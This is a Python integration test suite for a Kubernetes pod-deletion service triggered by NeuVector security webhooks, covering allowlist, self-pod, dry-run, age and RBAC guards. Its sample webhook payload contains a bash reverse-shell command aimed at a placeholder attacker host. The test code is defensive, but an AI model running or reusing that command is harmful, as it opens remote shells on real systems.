#!/usr/bin/env python3
"""
Comprehensive Integration Test Suite for Destroyer.py
Tests the pod redeployment logic with mock Kubernetes API and NeuVector webhooks
"""

import json
import os
import sys
import time
import threading
import subprocess
import datetime
import urllib.request
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Optional, Dict, Any, Tuple
import socket


# Configuration
MOCK_K8S_PORT = int(os.environ.get("MOCK_K8S_PORT", "9000"))
DESTROYER_PORT = int(os.environ.get("DESTROYER_PORT", "8080"))


class Colors:
    """ANSI color codes for output"""
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


def print_section(title: str):
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'=' * 70}")
    print(f"  {title}")
    print(f"{'=' * 70}{Colors.RESET}\n")


def print_test(name: str, passed: bool, message: str = ""):
    status = f"{Colors.GREEN}✓ PASS{Colors.RESET}" if passed else f"{Colors.RED}✗ FAIL{Colors.RESET}"
    msg = f" - {message}" if message else ""
    print(f"  {status}: {name}{msg}")


def print_info(message: str):
    print(f"{Colors.BLUE}ℹ {message}{Colors.RESET}")


def print_error(message: str):
    print(f"{Colors.RED}✗ {message}{Colors.RESET}")


def print_success(message: str):
    print(f"{Colors.GREEN}✓ {message}{Colors.RESET}")


# Store for tracking mock K8s API state
MOCK_K8S_STATE = {"pods": {}, "deleted_pods": []}


def create_pod_object(
    namespace: str,
    pod_name: str,
    container_name: str = "app",
    age_seconds: int = 300,
    started_at: Optional[str] = None,
) -> Dict[str, Any]:
    """Create a realistic Kubernetes pod object"""
    
    if started_at is None:
        # Calculate start time based on age
        start_time = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(seconds=age_seconds)
        started_at = start_time.strftime("%Y-%m-%dT%H:%M:%SZ")
    
    return {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": pod_name,
            "namespace": namespace,
            "uid": f"uid-{pod_name}",
            "resourceVersion": "12345",
            "creationTimestamp": started_at,
            "labels": {
                "app": pod_name,
                "version": "v1",
            },
        },
        "spec": {
            "containers": [
                {
                    "name": container_name,
                    "image": f"nginx:latest",
                    "imagePullPolicy": "IfNotPresent",
                }
            ],
            "restartPolicy": "Always",
        },
        "status": {
            "phase": "Running",
            "hostIP": "10.0.0.1",
            "podIP": "10.1.0.5",
            "startTime": started_at,
            "containerStatuses": [
                {
                    "name": container_name,
                    "state": {
                        "running": {
                            "startedAt": started_at,
                        }
                    },
                    "ready": True,
                    "restartCount": 0,
                    "imageID": "nginx@sha256:abc123",
                    "containerID": "containerd://abc123def456",
                }
            ],
        },
    }


class MockK8sHandler(BaseHTTPRequestHandler):
    """Mock Kubernetes API server"""
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        path = self.path
        
        # Get pod
        match = urllib.parse.urlparse(path)
        if match.path.startswith("/api/v1/namespaces/"):
            parts = match.path.split("/")
            # /api/v1/namespaces/{ns}/pods/{pod}
            # parts = ['', 'api', 'v1', 'namespaces', '{ns}', 'pods', '{pod}']
            if len(parts) >= 7 and parts[5] == "pods":
                namespace = urllib.parse.unquote(parts[4])
                pod_name = urllib.parse.unquote(parts[6])
                
                pod_key = f"{namespace}/{pod_name}"
                
                if pod_key in MOCK_K8S_STATE["pods"]:
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(MOCK_K8S_STATE["pods"][pod_key]).encode("utf-8"))
                    return
                else:
                    # Pod not found
                    self.send_response(404)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    error = {"kind": "Status", "status": "Failure", "message": "not found"}
                    self.wfile.write(json.dumps(error).encode("utf-8"))
                    return
        
        self.send_response(404)
        self.end_headers()
    
    def do_DELETE(self):
        """Handle DELETE requests (pod deletion)"""
        path = self.path
        
        # Delete pod
        match = urllib.parse.urlparse(path)
        if match.path.startswith("/api/v1/namespaces/"):
            parts = match.path.split("/")
            # /api/v1/namespaces/{ns}/pods/{pod}
            # parts = ['', 'api', 'v1', 'namespaces', '{ns}', 'pods', '{pod}']
            if len(parts) >= 7 and parts[5] == "pods":
                namespace = urllib.parse.unquote(parts[4])
                pod_name = urllib.parse.unquote(parts[6])
                
                pod_key = f"{namespace}/{pod_name}"
                
                if pod_key in MOCK_K8S_STATE["pods"]:
                    MOCK_K8S_STATE["deleted_pods"].append(pod_key)
                    del MOCK_K8S_STATE["pods"][pod_key]
                    
                    self.send_response(202)  # Accepted
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    status = {"kind": "Status", "status": "Success"}
                    self.wfile.write(json.dumps(status).encode("utf-8"))
                    return
                else:
                    self.send_response(404)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    return
        
        self.send_response(405)
        self.end_headers()


def send_webhook_to_destroyer(payload: Dict[str, Any]) -> Tuple[bool, str]:
    """Send a webhook payload to the Destroyer app"""
    try:
        url = f"http://127.0.0.1:{DESTROYER_PORT}/"
        body = json.dumps(payload).encode("utf-8")
        
        req = urllib.request.Request(
            url,
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        
        with urllib.request.urlopen(req, timeout=5) as resp:
            response = resp.read().decode("utf-8")
            return (True, response)
    except Exception as e:
        return (False, str(e))


def create_neuvector_webhook(
    namespace: str,
    pod_name: str,
    container_name: str = "app",
    level: str = "high",
    severity: int = 3,
) -> Dict[str, Any]:
    """Create a realistic NeuVector webhook payload"""
    now = int(time.time())
    
    return {
        "event_id": "evt_12345",
        "event_type": "security",
        "name": "Suspicious process executed",
        "level": level,
        "severity": severity,
        "cluster_name": "prod-cluster",
        "workload_domain": namespace,
        "workload_name": pod_name,
        "workload_service": container_name,
        "container_name": container_name,
        "workload_image": "nginx:latest",
        "proc_cmd": "/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "proc_parent_name": "containerd-shim",
        "proc_effective_user": "root",
        "action": "quarantine",
        "reported_timestamp": now,
        "timestamp": now,
    }


def run_mock_k8s_server(port: int) -> threading.Thread:
    """Start the mock Kubernetes API server in a thread"""
    server = HTTPServer(("127.0.0.1", port), MockK8sHandler)
    
    def serve():
        server.timeout = 1
        while True:
            server.handle_request()
    
    thread = threading.Thread(target=serve, daemon=True)
    thread.start()
    
    time.sleep(0.1)  # Give server time to start
    return thread


def start_destroyer_app(
    kubernetes_url: str,
    dry_run: bool = False,
    excluded_namespaces: Optional[str] = None,
    min_age_seconds: int = 15,
    pod_redeploy_enabled: bool = True,
) -> subprocess.Popen:
    """Start the Destroyer app in a subprocess"""
    
    env = os.environ.copy()
    env["KUBERNETES_API_URL"] = kubernetes_url
    env["KUBERNETES_SERVICE_HOST"] = "127.0.0.1"
    env["KUBERNETES_SERVICE_PORT_HTTPS"] = str(MOCK_K8S_PORT)
    env["DEBUG"] = "true"
    env["REDEPLOY_DRY_RUN"] = "true" if dry_run else "false"
    env["REDEPLOY_MIN_AGE_SECONDS"] = str(min_age_seconds)
    env["REDEPLOY_ALLOWED_NAMESPACES"] = "default"
    env["ENABLE_POD_REDEPLOY"] = "true" if pod_redeploy_enabled else "false"
    
    if excluded_namespaces:
        env["REDEPLOY_EXCLUDED_NAMESPACES"] = excluded_namespaces
    
    # Get the directory where this script is located
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    proc = subprocess.Popen(
        [
            sys.executable,
            "Destroyer.py",
            "--debug",
            f"--k8s-api={kubernetes_url}",
            f"--port={DESTROYER_PORT}",
        ],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        cwd=script_dir,
        text=True,
        bufsize=1,
    )
    
    time.sleep(1)  # Give Destroyer time to start
    return proc


def wait_for_port(port: int, timeout: int = 10) -> bool:
    """Wait for a port to become available"""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(("127.0.0.1", port))
            sock.close()
            if result == 0:
                return True
        except Exception:
            pass
        time.sleep(0.1)
    return False


def test_empty_allowlist_guard():
    """Test: real deletion requires an explicit namespace allowlist"""
    print_section("Test 0: Empty Allowlist (Should Skip)")

    import Destroyer

    original_enabled = Destroyer.ENABLE_POD_REDEPLOY
    original_allowed = Destroyer.REDEPLOY_ALLOWED_NAMESPACES
    original_excluded = Destroyer.REDEPLOY_EXCLUDED_NAMESPACES
    try:
        Destroyer.ENABLE_POD_REDEPLOY = True
        Destroyer.REDEPLOY_ALLOWED_NAMESPACES = set()
        Destroyer.REDEPLOY_EXCLUDED_NAMESPACES = set()
        result = Destroyer.maybe_redeploy_pod(
            {"workload_domain": "default", "workload_name": "test-pod"}
        )
        passed = result == "SKIPPED: no namespaces approved"
        print_test("Deletion skipped without an allowlist", passed, result)
        return passed
    finally:
        Destroyer.ENABLE_POD_REDEPLOY = original_enabled
        Destroyer.REDEPLOY_ALLOWED_NAMESPACES = original_allowed
        Destroyer.REDEPLOY_EXCLUDED_NAMESPACES = original_excluded


def test_self_pod_guard():
    """Test: Destroyer refuses to delete its own pod"""
    print_section("Test 0.1: Self-Pod Guard (Should Skip)")

    import Destroyer

    original_enabled = Destroyer.ENABLE_POD_REDEPLOY
    original_allowed = Destroyer.REDEPLOY_ALLOWED_NAMESPACES
    original_excluded = Destroyer.REDEPLOY_EXCLUDED_NAMESPACES
    original_pod_name = Destroyer.POD_NAME
    original_pod_namespace = Destroyer.POD_NAMESPACE
    try:
        Destroyer.ENABLE_POD_REDEPLOY = True
        Destroyer.REDEPLOY_ALLOWED_NAMESPACES = {"destroyer-system"}
        Destroyer.REDEPLOY_EXCLUDED_NAMESPACES = set()
        Destroyer.POD_NAME = "destroyer-abc123"
        Destroyer.POD_NAMESPACE = "destroyer-system"
        result = Destroyer.maybe_redeploy_pod(
            {
                "workload_domain": "destroyer-system",
                "workload_name": "destroyer-abc123",
            }
        )
        passed = result == "SKIPPED: refusing to delete Destroyer pod"
        print_test("Destroyer pod was protected", passed, result)
        return passed
    finally:
        Destroyer.ENABLE_POD_REDEPLOY = original_enabled
        Destroyer.REDEPLOY_ALLOWED_NAMESPACES = original_allowed
        Destroyer.REDEPLOY_EXCLUDED_NAMESPACES = original_excluded
        Destroyer.POD_NAME = original_pod_name
        Destroyer.POD_NAMESPACE = original_pod_namespace


def test_dry_run_guard():
    """Test: dry-run reports eligible deletion without deleting the pod"""
    print_section("Test 0.2: Dry-Run Guard (Should Skip Deletion)")

    import Destroyer

    original_enabled = Destroyer.ENABLE_POD_REDEPLOY
    original_dry_run = Destroyer.REDEPLOY_DRY_RUN
    original_allowed = Destroyer.REDEPLOY_ALLOWED_NAMESPACES
    original_excluded = Destroyer.REDEPLOY_EXCLUDED_NAMESPACES
    original_api_url = os.environ.get("KUBERNETES_API_URL")
    pod_key = "default/test-pod-dry-run"
    deleted_before = list(MOCK_K8S_STATE["deleted_pods"])
    MOCK_K8S_STATE["pods"][pod_key] = create_pod_object(
        "default", "test-pod-dry-run", age_seconds=300
    )

    try:
        Destroyer.ENABLE_POD_REDEPLOY = True
        Destroyer.REDEPLOY_DRY_RUN = True
        Destroyer.REDEPLOY_ALLOWED_NAMESPACES = {"default"}
        Destroyer.REDEPLOY_EXCLUDED_NAMESPACES = set()
        os.environ["KUBERNETES_API_URL"] = f"http://127.0.0.1:{MOCK_K8S_PORT}"

        result = Destroyer.maybe_redeploy_pod(
            create_neuvector_webhook("default", "test-pod-dry-run")
        )
        passed = (
            result.startswith("DRY_RUN:")
            and pod_key in MOCK_K8S_STATE["pods"]
            and MOCK_K8S_STATE["deleted_pods"] == deleted_before
        )
        print_test("Dry-run preserved the pod", passed, result)
        return passed
    finally:
        Destroyer.ENABLE_POD_REDEPLOY = original_enabled
        Destroyer.REDEPLOY_DRY_RUN = original_dry_run
        Destroyer.REDEPLOY_ALLOWED_NAMESPACES = original_allowed
        Destroyer.REDEPLOY_EXCLUDED_NAMESPACES = original_excluded
        MOCK_K8S_STATE["pods"].pop(pod_key, None)
        if original_api_url is None:
            os.environ.pop("KUBERNETES_API_URL", None)
        else:
            os.environ["KUBERNETES_API_URL"] = original_api_url


def test_manifest_generation_policy():
    """Test: manifest generation grants deletion access only with explicit opt-in"""
    print_section("Test 0.3: Manifest Generation Safety")

    from generate_deployment import generate_yaml

    default_manifest = generate_yaml("destroyer-test")
    enabled_manifest = generate_yaml(
        "destroyer-test",
        enable_redeploy=True,
        allowed_namespaces=("app-dev",),
    )
    rejected_without_allowlist = False
    try:
        generate_yaml("destroyer-test", enable_redeploy=True)
    except ValueError:
        rejected_without_allowlist = True

    passed = (
        "kind: ClusterRole\n" not in default_manifest
        and 'name: ENABLE_POD_REDEPLOY\n              value: "false"' in default_manifest
        and "automountServiceAccountToken: false" in default_manifest
        and 'name: ENABLE_POD_REDEPLOY\n              value: "true"' in enabled_manifest
        and "automountServiceAccountToken: true" in enabled_manifest
        and 'name: REDEPLOY_ALLOWED_NAMESPACES\n              value: "app-dev"' in enabled_manifest
        and 'verbs: ["get", "delete"]' in enabled_manifest
        and rejected_without_allowlist
    )
    print_test("Deletion RBAC requires an explicit namespace allowlist", passed)
    return passed


def test_normal_pod_redeploy():
    """Test: Normal pod redeploy - pod exists and is old enough"""
    print_section("Test 1: Normal Pod Redeploy")
    
    try:
        # Setup
        pod_key = "default/test-pod-normal"
        MOCK_K8S_STATE["pods"][pod_key] = create_pod_object(
            "default",
            "test-pod-normal",
            container_name="app",
            age_seconds=300,  # 5 minutes old, well above 15 second minimum
        )
        
        # Send webhook
        webhook = create_neuvector_webhook(
            "default",
            "test-pod-normal",
            container_name="app",
        )
        
        success, response = send_webhook_to_destroyer(webhook)
        
        # Verify
        test_1_sent = success
        print_test("Webhook sent successfully", test_1_sent)
        
        time.sleep(1.0)  # Let processing happen - increased wait time
        
        test_1_deleted = pod_key in MOCK_K8S_STATE["deleted_pods"]
        print_test("Pod was deleted", test_1_deleted)
        
        return test_1_sent and test_1_deleted
    except Exception as e:
        print_error(f"Test failed with exception: {e}")
        return False


def test_pod_too_new():
    """Test: Pod too new - pod exists but not old enough"""
    print_section("Test 2: Pod Too New (Should Skip)")
    
    try:
        # Setup
        pod_key = "default/test-pod-young"
        MOCK_K8S_STATE["pods"][pod_key] = create_pod_object(
            "default",
            "test-pod-young",
            container_name="app",
            age_seconds=5,  # Only 5 seconds old, below 15 second minimum
        )
        
        # Send webhook
        webhook = create_neuvector_webhook(
            "default",
            "test-pod-young",
            container_name="app",
        )
        
        success, response = send_webhook_to_destroyer(webhook)
        
        # Verify
        test_2_sent = success
        print_test("Webhook sent successfully", test_2_sent)
        
        time.sleep(0.5)
        
        test_2_not_deleted = pod_key not in MOCK_K8S_STATE["deleted_pods"]
        print_test("Pod was NOT deleted (correctly skipped)", test_2_not_deleted)
        
        return test_2_sent and test_2_not_deleted
    except Exception as e:
        print_error(f"Test failed with exception: {e}")
        return False


def test_excluded_namespace():
    """Test: Excluded namespace - pod in excluded namespace should be skipped"""
    print_section("Test 3: Excluded Namespace (Should Skip)")
    
    try:
        # Setup
        pod_key = "kube-system/test-pod-excluded"
        MOCK_K8S_STATE["pods"][pod_key] = create_pod_object(
            "kube-system",
            "test-pod-excluded",
            container_name="app",
            age_seconds=300,  # Old enough normally
        )
        
        # Send webhook
        webhook = create_neuvector_webhook(
            "kube-system",
            "test-pod-excluded",
            container_name="app",
        )
        
        success, response = send_webhook_to_destroyer(webhook)
        
        # Verify
        test_3_sent = success
        print_test("Webhook sent successfully", test_3_sent)
        
        time.sleep(0.5)
        
        test_3_not_deleted = pod_key not in MOCK_K8S_STATE["deleted_pods"]
        print_test("Pod was NOT deleted (namespace excluded)", test_3_not_deleted)
        
        return test_3_sent and test_3_not_deleted
    except Exception as e:
        print_error(f"Test failed with exception: {e}")
        return False


def test_missing_pod():
    """Test: Missing pod - webhook for pod that doesn't exist"""
    print_section("Test 4: Missing Pod (Should Skip)")
    
    try:
        # Setup - don't add pod to state
        deleted_before = list(MOCK_K8S_STATE["deleted_pods"])
        
        # Send webhook
        webhook = create_neuvector_webhook(
            "default",
            "test-pod-missing",
            container_name="app",
        )
        
        success, response = send_webhook_to_destroyer(webhook)
        
        # Verify
        test_4_sent = success
        print_test("Webhook sent successfully", test_4_sent)
        
        time.sleep(0.5)
        
        test_4_safe = MOCK_K8S_STATE["deleted_pods"] == deleted_before
        print_test("No pod was incorrectly deleted", test_4_safe)
        
        return test_4_sent and test_4_safe
    except Exception as e:
        print_error(f"Test failed with exception: {e}")
        return False


def test_incomplete_webhook():
    """Test: Incomplete webhook - missing required fields"""
    print_section("Test 5: Incomplete Webhook (Should Skip)")
    
    try:
        deleted_before = list(MOCK_K8S_STATE["deleted_pods"])

        # Send incomplete webhook (missing namespace)
        webhook = {
            "event_id": "evt_incomplete",
            "workload_name": "test-pod",
            # Missing workload_domain (namespace)
            "level": "high",
        }
        
        success, response = send_webhook_to_destroyer(webhook)
        
        # Verify
        test_5_sent = success
        print_test("Webhook sent successfully", test_5_sent)
        
        time.sleep(0.5)
        
        test_5_safe = MOCK_K8S_STATE["deleted_pods"] == deleted_before
        print_test("No pod was incorrectly deleted", test_5_safe)
        
        return test_5_sent and test_5_safe
    except Exception as e:
        print_error(f"Test failed with exception: {e}")
        return False


def test_specific_container():
    """Test: Container-specific selection"""
    print_section("Test 6: Container-Specific Selection")
    
    try:
        # Setup - pod with multiple containers
        pod_key = "default/test-pod-multicontainer"
        MOCK_K8S_STATE["pods"][pod_key] = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": "test-pod-multicontainer",
                "namespace": "default",
                "creationTimestamp": (
                    datetime.datetime.now(datetime.timezone.utc) - 
                    datetime.timedelta(seconds=300)
                ).strftime("%Y-%m-%dT%H:%M:%SZ"),
            },
            "status": {
                "containerStatuses": [
                    {
                        "name": "web",
                        "state": {"running": {"startedAt": (
                            datetime.datetime.now(datetime.timezone.utc) - 
                            datetime.timedelta(seconds=300)
                        ).strftime("%Y-%m-%dT%H:%M:%SZ")}},
                        "ready": True,
                    },
                    {
                        "name": "sidecar",
                        "state": {"running": {"startedAt": (
                            datetime.datetime.now(datetime.timezone.utc) - 
                            datetime.timedelta(seconds=300)
                        ).strftime("%Y-%m-%dT%H:%M:%SZ")}},
                        "ready": True,
                    },
                ]
            },
        }
        
        # Send webhook for specific container
        webhook = create_neuvector_webhook(
            "default",
            "test-pod-multicontainer",
            container_name="web",
        )
        
        success, response = send_webhook_to_destroyer(webhook)
        
        # Verify
        test_6_sent = success
        print_test("Webhook sent successfully", test_6_sent)
        
        time.sleep(1.0)  # Let processing happen - increased wait time
        
        test_6_deleted = pod_key in MOCK_K8S_STATE["deleted_pods"]
        print_test("Pod was deleted", test_6_deleted)
        
        return test_6_sent and test_6_deleted
    except Exception as e:
        print_error(f"Test failed with exception: {e}")
        return False


def run_tests():
    """Run all integration tests"""
    print_section("DESTROYER INTEGRATION TEST SUITE")
    print_info(f"Mock K8s API on port {MOCK_K8S_PORT}")
    print_info(f"Destroyer app on port {DESTROYER_PORT}")
    
    # Reset state
    MOCK_K8S_STATE["pods"].clear()
    MOCK_K8S_STATE["deleted_pods"].clear()
    
    # Start mock K8s server
    print_info("Starting mock Kubernetes API server...")
    mock_k8s_thread = run_mock_k8s_server(MOCK_K8S_PORT)
    time.sleep(0.5)
    print_success("Mock Kubernetes API server started")
    
    # Start Destroyer app
    print_info("Starting Destroyer application...")
    destroyer_proc = start_destroyer_app(
        kubernetes_url=f"http://127.0.0.1:{MOCK_K8S_PORT}",
        dry_run=False,
        min_age_seconds=15,
    )
    
    if destroyer_proc.poll() is not None or not wait_for_port(DESTROYER_PORT, timeout=10):
        print_error(f"Destroyer app failed to start on port {DESTROYER_PORT}")
        destroyer_proc.terminate()
        return False
    
    print_success("Destroyer application started")
    
    time.sleep(1)  # Give everything time to settle
    
    # Run tests
    results = []

    try:
        results.append(("Empty Allowlist", test_empty_allowlist_guard()))
        results.append(("Self-Pod Guard", test_self_pod_guard()))
        results.append(("Dry Run", test_dry_run_guard()))
        results.append(("Manifest Generation Safety", test_manifest_generation_policy()))
        results.append(("Normal Pod Redeploy", test_normal_pod_redeploy()))
        results.append(("Pod Too New", test_pod_too_new()))
        results.append(("Excluded Namespace", test_excluded_namespace()))
        results.append(("Missing Pod", test_missing_pod()))
        results.append(("Incomplete Webhook", test_incomplete_webhook()))
        results.append(("Container Selection", test_specific_container()))
    finally:
        # Cleanup
        print_section("Cleanup")
        print_info("Stopping Destroyer application...")
        destroyer_proc.terminate()
        try:
            destroyer_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            destroyer_proc.kill()
        print_success("Destroyer application stopped")
    
    # Print summary
    print_section("TEST SUMMARY")
    passed = sum(1 for _, result in results if result)
    total = len(results)
    
    for name, result in results:
        print_test(name, result)
    
    print(f"\n{Colors.BOLD}Results: {passed}/{total} tests passed{Colors.RESET}")
    
    if passed == total:
        print_success("All tests passed!")
        return True
    else:
        print_error(f"{total - passed} test(s) failed")
        return False


if __name__ == "__main__":
    try:
        success = run_tests()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n\nTests interrupted by user")
        sys.exit(1)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
